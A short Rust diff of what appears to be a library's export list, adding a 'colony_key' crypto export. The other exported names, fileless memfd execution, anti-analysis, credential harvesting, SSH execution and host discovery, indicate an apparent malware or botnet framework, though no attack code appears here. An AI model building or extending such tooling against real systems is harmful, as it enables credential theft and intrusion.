@@ -70,7 +70,7 @@ pub use comms::HiveChamber;
 pub use identity::AgentIdentity;
 pub use ldc::{Message, Payload, Role, Value, Decision, SignedMessage};
 pub use consensus::ConsensusEngine;
-pub use crypto::{encrypt_chacha20, decrypt_chacha20, decrypt_model, derive_key, derive_seed};
+pub use crypto::{encrypt_chacha20, decrypt_chacha20, decrypt_model, derive_key, derive_seed, colony_key};
 pub use fileless::MemfdBinary;
 pub use anti_analysis::AntiAnalysis;
 pub use lateral::{harvest_credentials, exec_ssh, discover_hosts};
